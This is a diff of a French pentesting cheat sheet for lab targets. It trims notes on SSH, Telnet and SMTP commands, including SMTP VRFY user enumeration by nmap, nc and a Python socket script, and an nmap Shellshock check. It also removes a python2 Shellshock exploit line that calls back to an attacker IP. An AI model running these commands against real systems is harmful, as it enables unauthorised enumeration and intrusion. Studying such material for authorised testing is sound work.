@@ -707,15 +707,12 @@ scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/con
 
 **Sécurité SSH :** `accept-new` accepte automatiquement une nouvelle empreinte, mais refuse une empreinte modifiée. Vérifier l'empreinte par un canal fiable avant toute première connexion sensible.  
 
-<p class="oscp-command-note">SSH : accepter automatiquement une nouvelle clé d'hôte, mais refuser une clé déjà connue qui a changé.</p>
+<p class="oscp-command-note">SSH : accepter une nouvelle clé d'hôte, mais refuser une clé modifiée.</p>
 
 ```bash
 ssh -o StrictHostKeyChecking=accept-new <UTILISATEUR>@<IP_CIBLE>
 
 ```
-
-**Paramètres et repères :**
-`aes128-cbc`  
 
 ```bash
 # Algorithme CBC ancien : peut être refusé par les configurations modernes.
@@ -731,10 +728,7 @@ ssh user@target_ip
 
 ```
 
-**Paramètres et repères :**
-`diffie-hellman-group1-sha1` (échange de clés SSH ancien) · `ssh-rsa` (clé SSH RSA ancienne)  
-
-<p class="oscp-command-note">Tester la compatibilité avec d'anciens algorithmes SSH ; cela n'implique pas d'exécuter un shell distant.</p>
+<p class="oscp-command-note">SSH : autoriser temporairement d'anciens algorithmes pour une cible de laboratoire.</p>
 
 ```bash
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa utilisateur@192.0.2.10
@@ -743,7 +737,7 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa uti
 
 ```
 
-<p class="oscp-command-note">SSH : exécuter whoami sur la machine distante avec un compte autorisé, sans session interactive.</p>
+<p class="oscp-command-note">SSH : exécuter `whoami` à distance sans ouvrir de shell interactif.</p>
 
 ```bash
 ssh utilisateur@192.0.2.10 'whoami'
@@ -761,14 +755,14 @@ esac
 
 ```
 
-<p class="oscp-command-note">Copier un script local vers un répertoire distant autorisé avec une clé SSH ; aucune écoute réseau n'est nécessaire.</p>
+<p class="oscp-command-note">SCP : copier un script vers la cible avec une clé SSH.</p>
 
 ```bash
 scp -i ~/.ssh/id_ed25519 script.sh utilisateur@192.0.2.10:/home/utilisateur/
 
 ```
 
-<p class="oscp-command-note">SSH : ouvrir une session avec une clé privée locale ; protéger son fichier avec chmod 600.</p>
+<p class="oscp-command-note">SSH : se connecter avec une clé privée locale (`chmod 600`).</p>
 
 ```bash
 ssh -i <private_key_file> <user>@<target_ip>
@@ -777,7 +771,7 @@ ssh -i <private_key_file> <user>@<target_ip>
 
 ### 23: Telnet
 
-<p class="oscp-command-note">Se connecter au service Telnet sur TCP 23 ; protocole non chiffré, éviter d'y saisir de vrais secrets.</p>
+<p class="oscp-command-note">Telnet : ouvrir une connexion TCP 23. Identifiants non chiffrés.</p>
 
 ```bash
 # Connexion de base
@@ -790,31 +784,18 @@ telnet -l utilisateur 192.0.2.10 23
 
 ### 25: SMTP
 
-<p class="oscp-command-note">SMTP : interroger les capacités et réponses VRFY ; séparer commandes shell, saisie interactive et sortie illustrative.</p>
+<p class="oscp-command-note">SMTP : relever les capacités et tester VRFY sur une cible autorisée.</p>
 
 ```bash
 # Identifier les capacités SMTP et les réponses à l'énumération d'utilisateurs
 nmap -sV -p 25 --script smtp-commands,smtp-enum-users 192.0.2.10
 
-# Dialogue SMTP : ouvrir une seule connexion avec nc OU telnet, puis saisir EHLO et VRFY dans cette session
-nc -nv <target_ip> 25
-telnet <target_ip> 25
-EHLO exemple.local
-VRFY utilisateur
-
-# Transcription illustrative de session SMTP : ne pas exécuter ces lignes dans Bash
-kali@kali:~$ nc -nv 192.168.123.8 25
-(UNKNOWN) [192.168.123.8] 25 (smtp) open
-220 mail ESMTP Postfix (Ubuntu)
-VRFY root
-252 2.0.0 root
-VRFY test_user
-550 5.1.1 <test_user>: Recipient address rejected: User unknown in local recipient table
-^C
+# Ouvrir la connexion SMTP depuis Kali
+nc -nv <IP_CIBLE> 25
 
 ```
 
-<p class="oscp-command-note">SMTP : exemples de sorties du script local vrfy.py ; ne pas copier les invites ni les réponses comme commandes.</p>
+<p class="oscp-command-note">SMTP : exemples de réponses du serveur à la commande VRFY.</p>
 
 ```bash
 # Exemple de sortie d'un script nommé vrfy.py (fichier à créer depuis le bloc Python ci-dessous)
@@ -828,7 +809,7 @@ b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipi
 
 ```
 
-<p class="oscp-command-note">Python SMTP : envoyer VRFY pour un utilisateur puis afficher la réponse du serveur sur TCP 25.</p>
+<p class="oscp-command-note">Python : envoyer `VRFY` et afficher la réponse SMTP.</p>
 
 ```python
 import socket
@@ -861,7 +842,7 @@ s.close()
 
 ```
 
-<p class="oscp-command-note">Windows : activer TelnetClient avec DISM (droits administrateur requis) ; la suite illustre une session SMTP.</p>
+<p class="oscp-command-note">Windows : installer le client Telnet avec les droits administrateur.</p>
 
 ```powershell
 dism /online /Enable-Feature /FeatureName:TelnetClient
@@ -876,17 +857,12 @@ VRFY root
 
 ```
 
-<p class="oscp-command-note">HTTP Shellshock : exemple de test NSE ciblant un CGI ; le script Python tiers cité n'est pas fourni.</p>
+<p class="oscp-command-note">Nmap : tester Shellshock sur un CGI autorisé.</p>
 
 ```bash
 # Vérifier une exposition potentielle à Shellshock sur un CGI du laboratoire
 nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 192.0.2.10
                 
-# Référence historique : https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
-python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>
-
-# Exemple historique uniquement : script Python 2 externe ; vérifier sa provenance et ses paramètres avant utilisation
-
 ```
 
 #### Capacités SMTP exposées
